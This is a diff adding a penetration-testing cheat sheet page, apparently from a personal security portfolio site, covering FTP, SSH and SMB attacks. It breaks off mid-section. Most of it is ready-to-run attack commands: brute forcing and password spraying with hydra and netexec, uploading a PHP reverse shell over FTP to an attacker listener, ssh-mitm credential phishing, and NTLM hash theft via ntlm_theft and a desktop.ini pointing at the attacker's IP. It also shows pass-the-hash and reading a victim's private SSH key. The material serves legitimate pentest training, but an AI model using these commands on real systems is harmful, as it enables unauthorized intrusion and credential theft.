@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Network Services Pentesting Cheat Sheet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Network Services Pentesting Cheat Sheet | Vault-Tec Terminal</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Network Services Pentesting Cheat Sheet" />
+<meta name="author" content="RedTeamer403" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="RedTeamer403 Security Portfolio" />
+<meta property="og:description" content="RedTeamer403 Security Portfolio" />
+<link rel="canonical" href="http://localhost:4000/notes/network/services/" />
+<meta property="og:url" content="http://localhost:4000/notes/network/services/" />
+<meta property="og:site_name" content="Vault-Tec Terminal" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Network Services Pentesting Cheat Sheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"RedTeamer403 Security Portfolio","headline":"Network Services Pentesting Cheat Sheet","url":"http://localhost:4000/notes/network/services/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div id="init-screen" class="init-screen">
+    <div class="init-content">
+      <div class="init-step">Initializing VAULT-TEC OS...</div>
+      <div class="init-step">Loading security protocols...</div>
+      <div class="init-step">Establishing secure connection...</div>
+      <div class="init-step">Connection established.</div>
+      <div class="init-step">SYSTEM READY</div>
+    </div>
+  </div>
+
+  <div id="main-content" class="main-content hidden">
+    <header>
+      <div class="container">
+        <h1>Vault-Tec Terminal</h1>
+        <nav>
+          <a href="/" >ABOUT</a>
+          <a href="/posts" >POSTS</a>
+          <a href="/notes" class="active">NOTES</a>
+          <a href="/tools" >TOOLS</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="search-container">
+        <input type="text" class="search-input" placeholder="Search notes...">
+      </div>
+      <div class="notes-container">
+        <div class="notes-sidebar">
+          <div class="notes-category">
+            <h3>CheatSheets</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cheat/curl/" >CURL</a>
+              <a href="/notes/cheat/DNS/" >DNS</a>
+              <a href="/notes/cheat/file/" >File Transfer</a>
+              <a href="/notes/cheat/hydra/" >Hydra</a>
+              <a href="/notes/cheat/john/" >JohnTheRipper</a>
+              <a href="/notes/cheat/ncat/" >NCAT</a>
+              <a href="/notes/cheat/nmap/" >NMAP</a>
+              <a href="/notes/cheat/shell/" >Reverse Shell</a>
+              <a href="/notes/cheat/wordlists/" >Wordlists</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Active Directory</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/ad/enum/" >Domain Enumeration</a>
+              <a href="/notes/ad/attack/" >Attack Vectors</a>
+              <a href="/notes/ad/persist/" >Persistence</a>
+              <a href="/notes/ad/lateral/" >Lateral Movement</a>
+            </div>
+          </div>
+          
+          <div class="notes-category">
+            <h3>Cloud</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cloud/aws/" >AWS</a>
+              <a href="/notes/cloud/azure/" >Azure</a>
+              <a href="/notes/cloud/google/" >Google</a>
+              <a href="/notes/cloud/terra/" >Terraform</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Container</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/container/docker/" >Docker</a>
+              <a href="/notes/container/k8s/" >Kubernetes</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Linux</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
+              <a href="/notes/linux/enum/" >Enumeration</a>
+              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
+              <a href="/notes/linux/post/" >Post Exploitation</a>
+              <a href="/notes/linux/services/" >Services</a>
+              <a href="/notes/linux/tools/" >Tools</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Network</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/network/exfil/" >Data Exfiltration</a>
+              <a href="/notes/network/scan/" >Port Scanning</a>
+              <a href="/notes/network/recon/" >Reconnaissance</a>
+              <a href="/notes/network/pivot/" >Pivoting</a>
+              <a href="/notes/network/services/" class="active">Services</a>
+              <a href="/notes/network/sniff/" >Traffic Analysis</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Tech Stack</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/tech/cms/" >CMS</a>
+              <a href="/notes/tech/db/" >Databases</a>
+              <a href="/notes/tech/devops/" >DevOps</a>
+              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
+              <a href="/notes/tech/iam/" >IAM</a>
+              <a href="/notes/tech/mon/" >Monitoring</a>
+              <a href="/notes/tech/open/" >Open-Source</a>
+              <a href="/notes/tech/util/" >Utilities</a>
+              <a href="/notes/tech/server/" >Web Servers</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Windows</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
+              <a href="/notes/windows/enum/" >Enumeration</a>
+              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
+              <a href="/notes/windows/post/" >Post Exploitation</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Web Application</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/web/recon/" >Reconnaissance</a>
+              <a href="/notes/web/vulns/" >Common Vulnerabilities</a>
+              <a href="/notes/web/auth/" >Authentication Bypass</a>
+              <a href="/notes/web/api/" >API Testing</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="notes-content">
+          <div id="search-results"></div>
+          <div id="note-content">
+            <h1 id="network-services-pentesting-cheat-sheet">Network Services Pentesting Cheat Sheet</h1>
+<details>
+  <summary>FTP (21)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Login</span>
+ftp &lt;IP&gt; <span class="c">#optional port</span>
+lftp &lt;IP&gt;
+anonymous:anonymous
+
+<span class="c">#Commands</span>
+<span class="nb">cd
+ls</span> <span class="nt">-a</span> <span class="c"># List all files (even hidden)</span>
+put &lt;filename&gt; <span class="c">#Upload file</span>
+get &lt;filename&gt; <span class="c">#Download file</span>
+mput/mget <span class="c">#Upload/Downlaod multiple files</span>
+quit
+
+<span class="c">#Download all files</span>
+wget <span class="nt">-m</span> ftp://anonymous:anonymous@10.10.10.98
+wget <span class="nt">-m</span> <span class="nt">--no-passive</span> ftp://anonymous:anonymous@10.10.10.98
+wget <span class="nt">-r</span> <span class="nt">--user</span><span class="o">=</span><span class="s2">"USERNAME"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"PASSWORD"</span> ftp://server.com/ <span class="c">#If your user/password has special characters</span>
+
+<span class="c">#nmap</span>
+nmap <span class="nt">--script</span> ftp-<span class="k">*</span> <span class="nt">-p</span> 21 &lt;IP&gt;
+
+<span class="c">#metasploit</span>
+use auxiliary/scanner/ftp/anonymous
+use auxiliary/scanner/ftp/ftp_login
+use auxiliary/scanner/ftp/ftp_version
+use auxiliary/scanner/ftp/ftp_bounce
+use auxiliary/scanner/ftp/bison_ftp_traversal
+use auxiliary/scanner/ftp/colorado_ftp_traversal
+use auxiliary/scanner/ftp/titanftp_xcrc_traversal
+
+<span class="c">#Enum dirs</span>
+gobuster <span class="nb">dir</span> <span class="nt">-u</span> ftp://&lt;IP&gt; <span class="nt">-w</span> wordlist
+
+<span class="c">#Bruteforce</span>
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; ftp
+hydra <span class="nt">-L</span> username.txt <span class="nt">-p</span> password &lt;target-ip&gt; ftp
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt ftp://&lt;target-ip&gt;
+hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password ftp://&lt;target-ip&gt;
+
+<span class="c">#Configuration</span>
+<span class="nb">cat</span> /etc/vsftpd.conf
+<span class="nb">cat</span> /etc/vsftpd/vsftpd.conf
+
+<span class="c">#Reverse Shell</span>
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <span class="nt">-O</span> shell.php
+<span class="c"># Edit some variables in shell.php</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'&lt;your-local-ip&gt;'</span><span class="p">;</span>
+<span class="nv">$port</span> <span class="o">=</span> 1234<span class="p">;</span>
+<span class="c">#Upload</span>
+ftp &lt;target-ip&gt;
+<span class="c"># Upload the payload you downloaded</span>
+ftp&gt; put shell.php
+<span class="c"># Get shell</span>
+nc <span class="nt">-lvnp</span> 1234
+http://vulnerable.com/path/to/ftp/shell.php
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>SSH (22)</summary>
+
+  <h3 id="basic-commands">Basic commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>systemctl start ssh
+<span class="nb">sudo </span>systemctl stop ssh
+<span class="nb">sudo </span>systemctl restart ssh
+<span class="nb">sudo </span>systemctl status ssh
+ps <span class="nt">-e</span> | <span class="nb">grep </span>ssh
+<span class="c">#Config</span>
+vim /etc/ssh/sshd_config
+<span class="c">#Chek for any Connection</span>
+<span class="nb">who</span> | <span class="nb">grep</span> &lt;username&gt;
+<span class="c">#Kill Connections</span>
+<span class="c"># -f: full process name to match</span>
+<span class="nb">sudo </span>pkill <span class="nt">-f</span> pts/#
+<span class="c"># Authentication logs</span>
+<span class="nb">grep</span> <span class="s1">'sshd'</span> /var/log/auth.log
+</code></pre></div>  </div>
+
+  <h3 id="enumeration">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> ssh-brute <span class="nt">-p</span> 22 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> ssh-auth-methods <span class="nt">--script-args</span><span class="o">=</span><span class="s2">"ssh.user=username"</span> <span class="nt">-p</span> 22 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> ssh-<span class="k">*</span> <span class="nt">-p</span> 22 &lt;target-ip&gt;
+
+<span class="c"># User enumeration</span>
+msfconsole
+msf&gt; use auxiliary/scanner/ssh/ssh_enumusers
+
+<span class="c"># Banner and Audit</span>
+nc &lt;IP&gt; 22
+ssh-audit &lt;target-ip&gt;
+</code></pre></div>  </div>
+  <h3 id="bruteforce">Bruteforce</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -t: tasks</span>
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; ssh <span class="nt">-t</span> 4
+hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; ssh <span class="nt">-t</span> 4
+
+<span class="c"># Specific ports</span>
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt <span class="nt">-s</span> 2222 &lt;target-ip&gt; ssh <span class="nt">-t</span> 4
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt ssh://&lt;target-ip&gt;:2222 <span class="nt">-t</span> 4
+
+<span class="c">#Password spraying</span>
+hydra <span class="nt">-L</span> usernames-list.txt <span class="nt">-p</span> Spring2025 ssh://10.1.1.10
+</code></pre></div>  </div>
+  <h3 id="crack-ssh-private-key">Crack SSH Private Key</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh2john private_key.txt <span class="o">&gt;</span> hash.txt
+<span class="c"># or</span>
+python2 /usr/share/john/ssh2john.py private_key.txt <span class="o">&gt;</span> hash.txt
+
+<span class="c"># Crack the password of the private key</span>
+john <span class="nt">--wordlist</span><span class="o">=</span>wordlist.txt hash.txt
+</code></pre></div>  </div>
+  <h3 id="connect">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh username@&lt;target-ip&gt;
+ssh username@&lt;target-ip&gt; <span class="nt">-p</span> 22
+
+<span class="c"># Using private key</span>
+ssh <span class="nt">-i</span> id_rsa username@&lt;target-ip&gt;
+
+<span class="c"># Without username</span>
+ssh 10.0.0.1
+
+<span class="c"># Additional options</span>
+<span class="c"># If we got the error message "no matching host key type found. Their offer: ssh-rsa..."</span>
+ssh <span class="nt">-o</span> <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>+ssh-rsa user@10.0.0.1
+<span class="c"># If we got error "no matching key exchange method found. Their offer: diffie-hellman-..."</span>
+ssh <span class="nt">-o</span> <span class="nv">KexAlgorithms</span><span class="o">=</span>+diffie-hellman-group1-sha1 user@10.0.0.1
+
+<span class="c">#Test connection</span>
+ssh <span class="nt">-T</span> username@10.0.0.1
+ssh <span class="nt">-T</span> username@10.0.0.1 <span class="nt">-vvv</span>
+
+<span class="c">#Command execution</span>
+ssh username@&lt;target-ip&gt; <span class="s1">'ls -l'</span>
+
+<span class="c">#Windows AD</span>
+ssh domain-name<span class="se">\\</span>username@domain-controller
+
+<span class="c">#Via Private Key</span>
+<span class="nb">cat</span> /home/&lt;victim-user&gt;/.ssh/id_rsa
+<span class="nb">echo</span> <span class="s1">'copied content of id_rsa'</span> <span class="o">&gt;</span> private_key.txt
+<span class="nb">chmod </span>600 private_key.txt
+ssh <span class="nt">-i</span> private_key.txt victim-user@&lt;remote-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="transfer-files">Transfer files</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Send a file</span>
+scp ./example.txt user@&lt;ip&gt;:./example.txt<span class="se">\</span>
+
+<span class="c"># Send a directory</span>
+scp <span class="nt">-r</span> ./example user@&lt;ip&gt;:/home/&lt;ip&gt;/
+
+<span class="c"># Download a file</span>
+scp user@&lt;ip&gt;:/home/&lt;user&gt;/path/to/file.txt <span class="nb">.</span>
+
+<span class="c"># Download a directory</span>
+scp <span class="nt">-r</span> user@&lt;ip&gt;:/home/&lt;user&gt;/path/to/file.txt <span class="nb">.</span>
+</code></pre></div>  </div>
+  <h3 id="create-ssh-keys">Create SSH Keys</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Specify the output file</span>
+ssh-keygen <span class="nt">-f</span> key
+
+<span class="c"># Specify Ed25519</span>
+ssy-keygen <span class="nt">-t</span> ed25519
+
+<span class="c">#In target machine install ssh</span>
+ssh-copy-id username@&lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="generate-ssh-keys-and-set-up-public-key-to-connect-remote-machine">Generate SSH Keys and Set Up Public Key to Connect Remote Machine</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Check if authorized_keys Exists in Remote Machine</span>
+<span class="nb">ls</span> /home/&lt;remote-user&gt;/.ssh/authorized_keys
+<span class="c">#If it exists, you may be able to connect SSH with your keys as victim user.</span>
+
+<span class="c">#Generate SSH Keys in Local Machine</span>
+ssh-keygen <span class="nt">-f</span> key
+
+<span class="c">#Copy the content of publick key</span>
+<span class="nb">cat</span> ./key.pub
+<span class="c">#Then copy the content of public key you generated.</span>
+
+<span class="c">#Add the Content of Publick Key to authorized_keys</span>
+<span class="c">#In remote machine</span>
+<span class="nb">echo</span> <span class="s1">'&lt;content of id_rsa.pub'</span> <span class="o">&gt;&gt;</span> /home/&lt;victim-user&gt;/.ssh/authorized_keys
+
+<span class="c">#Login with Private Key</span>
+<span class="c">#In local machine, we have a SSH private key in local machine so we can login the target SSH server with it.</span>
+<span class="c"># Change permission of the private key ('key', here)</span>
+<span class="nb">chmod </span>600 key
+<span class="c"># Login with it</span>
+ssh victim@&lt;target-ip&gt; <span class="nt">-i</span> key
+</code></pre></div>  </div>
+  <h3 id="stealing-credentials-via-mitm">Stealing Credentials via MiTM</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># If not have the ssh-mitm, install first.</span>
+pip3 <span class="nb">install </span>ssh-mitm <span class="nt">--upgrade</span>
+
+<span class="c"># --enable-trivial-auth: The "trivial authentication" phishing attack</span>
+<span class="c"># --remote-host: Specify the target ip/domain</span>
+<span class="c"># --listen-port: Specify the ip address to listen in local machine</span>
+ssh-mitm server <span class="nt">--enable-trivial-auth</span> <span class="nt">--remote-host</span> example.com <span class="nt">--listen-port</span> 2222
+
+</code></pre></div>  </div>
+
+</details>
+
+<details>
+  <summary>Telnet (23)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>SMTP (25/465/587)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>DNS (53)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>POP (110/995)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>Kerberos (88)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>SMB (139/445)</summary>
+
+  <h3 id="enumeration-1">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#nmap</span>
+nmap <span class="nt">--script</span> smb-brute <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-enum-shares.nse,smb-enum-users.nse <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-enum<span class="k">*</span> <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-protocols <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-vuln<span class="k">*</span> <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+
+<span class="c"># NetBIOS names</span>
+nmblookup <span class="nt">-A</span> 10.0.0.1
+nbtscan 10.0.0.1
+nbtscan <span class="nt">-r</span> 10.0.0.1/24
+
+<span class="c"># Enum4linux</span>
+enum4linux &lt;target-ip&gt;
+<span class="c"># All enumeration</span>
+enum4linux <span class="nt">-a</span> &lt;target-ip&gt;
+<span class="c"># Verbose</span>
+enum4linux <span class="nt">-v</span> &lt;target-ip&gt;
+<span class="c"># Specify username and password</span>
+enum4linux <span class="nt">-u</span> username <span class="nt">-p</span> password &lt;target-ip&gt;
+
+<span class="c"># Enum4linux-ng</span>
+<span class="c"># -A: All simple enumeration including nmblookup</span>
+enum4linux-ng <span class="nt">-A</span> &lt;target-ip&gt;
+<span class="c"># -As: All simple short enumeration without NetBIOS names lookup</span>
+enum4linux-ng <span class="nt">-As</span> &lt;target-ip&gt;
+<span class="c"># -u: Specific username</span>
+<span class="c"># -p: Specific password</span>
+enum4linux-ng <span class="nt">-u</span> <span class="s2">"administrator"</span> <span class="nt">-p</span> <span class="s2">"password"</span> &lt;target-ip&gt;
+
+<span class="c"># NetExec (https://www.netexec.wiki/)</span>
+netexec smb 10.0.0.0/24
+netexec smb &lt;target-ip&gt;
+netexec smb &lt;target-ip-1&gt; &lt;target-ip-2&gt;
+netexec smb &lt;target-ip&gt; <span class="nt">--pass-pol</span>
+netexec smb &lt;target-ip&gt; <span class="nt">--groups</span>
+netexec smb &lt;target-ip&gt; <span class="nt">--users</span>
+<span class="c"># Specify username/password</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--users</span>
+<span class="c"># -M zerologon: Scan for ZeroLogon</span>
+<span class="c"># -M petitpotam: Scan for PetitPotam</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-M</span> zerologon <span class="nt">-M</span> petitpotam
+</code></pre></div>  </div>
+  <h3 id="find-shared-folders">Find Shared Folders</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -N: No password</span>
+<span class="c"># -L: List shared directories</span>
+smbclient <span class="nt">-N</span> <span class="nt">-L</span> &lt;target-ip&gt;
+smbclient <span class="nt">-L</span> &lt;target-ip&gt; <span class="nt">-U</span> username
+
+smbmap <span class="nt">-H</span> &lt;target-ip&gt;
+<span class="c"># Recursive</span>
+smbmap <span class="nt">-H</span> &lt;target-ip&gt; <span class="nt">-R</span>
+<span class="c"># Username and password</span>
+smbmap <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-H</span> &lt;target-ip&gt;
+<span class="c"># Execute a command</span>
+smbmap <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-H</span> &lt;target-ip&gt; <span class="nt">-x</span> <span class="s1">'ipconfig'</span>
+
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--shares</span>
+
+impacket-psexec example.local/username@&lt;target-ip&gt;
+</code></pre></div>  </div>
+  <h3 id="bruteforce-1">Bruteforce</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> passwords.txt <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> usernames.txt <span class="nt">-H</span> ntlm_hashes.txt <span class="nt">--continue-on-success</span>
+
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; smb
+hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; smb
+
+<span class="c"># RID Brute Force</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--rid-brute</span> 20000
+
+<span class="c"># Using Metasploit</span>
+msfconsole <span class="nt">-q</span>
+msf&gt; use auxiliary/scanner/smb/smb_login
+
+<span class="c">#If we find credentials, we can use them for smbclient or WinRM. </span>
+<span class="c">#If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.</span>
+smbpasswd <span class="nt">-r</span> &lt;target-ip&gt; <span class="nt">-U</span> &lt;username&gt;
+<span class="c"># or</span>
+impacket-smbpasswd &lt;DOMAIN&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target-ip&gt; <span class="nt">-newpass</span> &lt;new-password&gt;
+<span class="c"># If you don't have impacket-smbpasswd, download it from a repository.</span>
+wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py
+</code></pre></div>  </div>
+
+  <h3 id="password-spraying">Password Spraying</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># User enumeration</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> John <span class="nt">-p</span> Password123 <span class="nt">--users</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> John <span class="nt">-H</span> &lt;NTLM_HASH&gt; <span class="nt">--users</span>
+
+<span class="c"># Find users with same password</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-p</span> Password123 <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-p</span> found_passwords.txt <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-H</span> &lt;NTLM_HASH&gt; <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-H</span> found_ntlm_hashes.txt <span class="nt">--continue-on-success</span>
+</code></pre></div>  </div>
+
+  <h3 id="rid-cycling-attack">RID Cycling Attack</h3>
+  <p>RID Enumeration. It attempts to enumerate user accounts through null sessions.</p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Anonymous logon</span>
+<span class="c"># 20000: Maximum RID to be cycled</span>
+impacket-lookupsid example.local/anonymous@&lt;target-ip&gt; 20000 <span class="nt">-no-pass</span>
+impacket-lookupsid example.local/guest@&lt;target-ip&gt; 20000 <span class="nt">-no-pass</span>
+impacket-lookupsid example.local/guest@&lt;target-ip&gt; 20000
+<span class="c"># Specify user</span>
+impacket-lookupsid example.local/user@&lt;target-ip&gt; 20000 <span class="nt">-hashes</span> &lt;lmhash&gt;:&lt;nthash&gt;
+impacket-lookupsid example.local/user@&lt;target-ip&gt; 20000
+
+
+<span class="c"># USEFUL COMMAND</span>
+<span class="c"># This command extract usernames. It's useful for further enumeration which uses usernames.</span>
+<span class="c"># Replace the following keywords:</span>
+<span class="c">#  - `example.com` =&gt; Target domain</span>
+<span class="c">#  - `10.0.0.1`    =&gt; Target IP</span>
+<span class="c">#  - `DOMAIN`      =&gt; Target domain name</span>
+impacket-lookupsid example.com/guest@10.0.0.1 20000 <span class="nt">-no-pass</span> <span class="o">&gt;</span> tmp.txt | <span class="nb">cat </span>tmp.txt | <span class="nb">grep </span>SidTypeUser | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f</span> 2 | <span class="nb">sed</span> <span class="s1">'s/DOMAIN\\//g'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt <span class="o">&amp;&amp;</span> <span class="nb">rm </span>tmp.txt
+</code></pre></div>  </div>
+
+  <h3 id="ntlm-stealing-via-ntlmtool">NTLM Stealing via ntlm_tool</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Greenwolf/ntlm_theft
+<span class="c"># -g all: Generate all files.</span>
+<span class="c"># -s: Local IP (attacker IP)</span>
+<span class="c"># -f: Folder to store generated files.</span>
+python3 ntlm_theft <span class="nt">-g</span> all <span class="nt">-s</span> &lt;local-ip&gt; <span class="nt">-f</span> samples
+
+<span class="c">#After generating files with ntlm_theft put the .lnk file to shared folder</span>
+smbclient <span class="nt">-N</span> //10.0.0.1/example
+smb&gt; put samples.lnk
+
+<span class="c">#Start responder</span>
+<span class="nb">sudo </span>responder <span class="nt">-I</span> eth0
+</code></pre></div>  </div>
+
+  <h3 id="ntlm-stealing-via-desktopini">NTLM Stealing via Desktop.ini</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#We can retrieve the hashes by putting desktop.ini file, that contains arbitrary icon resource path, to the shared folder.</span>
+<span class="c">#Create a new desktop.ini in local machine.</span>
+<span class="o">[</span>.ShellClassInfo]
+<span class="nv">IconResource</span><span class="o">=</span><span class="se">\\</span>&lt;local-ip&gt;<span class="se">\t</span>est
+
+<span class="c">#Then upload it to the writable shared folder.</span>
+put desktop.ini
+
+<span class="c">#Start responder</span>
+<span class="nb">sudo </span>responder <span class="nt">-I</span> eth0
+</code></pre></div>  </div>
+
+  <h3 id="connect-1">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># anonymous login</span>
+smbclient //10.0.0.1/somedir <span class="nt">-N</span>
+<span class="c"># If the folder name contains spaces, surround with double quotes</span>
+smbclient <span class="s2">"//10.0.0.1/some dir"</span> <span class="nt">-N</span>
+<span class="c"># Specify user</span>
+smbclient //10.0.0.1/somedir <span class="nt">-U</span> username
+<span class="c"># nobody, no-pass</span>
+smbclient //10.0.0.1/somedir <span class="nt">-N</span> <span class="nt">-U</span> nobody
+<span class="c"># Specify workgroup</span>
+smbclient <span class="nt">-L</span> 10.0.0.1 <span class="nt">-W</span> WORKGROUP <span class="nt">-U</span> username
+
+<span class="c">#Windows shell</span>
+impacket-wmiexec example.local/username@10.0.0.1
+<span class="c"># Pass the Hash</span>
+impacket-wmiexec <span class="nt">-hashes</span> abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
+</code></pre></div>  </div>
+
+  <h3 id="commands">Commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls
+</span>get file.txt
+get <span class="s2">"my document.txt"</span>
+
+<span class="c">#Download all files</span>
+mask <span class="s2">""</span>
+recurse ON
+prompt OFF
+mget <span class="k">*</span>
+
+<span class="c">#Download files using smbget</span>
+smbget smb://&lt;target-ip&gt;/somedir/example.txt <span class="nt">-U</span> username
+smbget <span class="nt">-R</span> smb://&lt;target-ip&gt;/somedir <span class="nt">-U</span> username
+<span class="c"># Specify workgroup</span>
+smbget <span class="nt">-R</span> smb://&lt;target-ip&gt;/somedir <span class="nt">-w</span> WORKGROUP <span class="nt">-U</span> username
+<span class="c"># as anonymous user</span>
+smbget smb://&lt;target-ip&gt;/somedir <span class="nt">-U</span> anonymous
+password: anonymous
+
+<span class="c">#Upload files</span>
+put example.txt
+
+<span class="c">#Reverse shell</span>
+put shell.aspx
+<span class="c">#Configure listener</span>
+nc <span class="nt">-lvnp</span> 4444
+<span class="c">#Access the shared file</span>
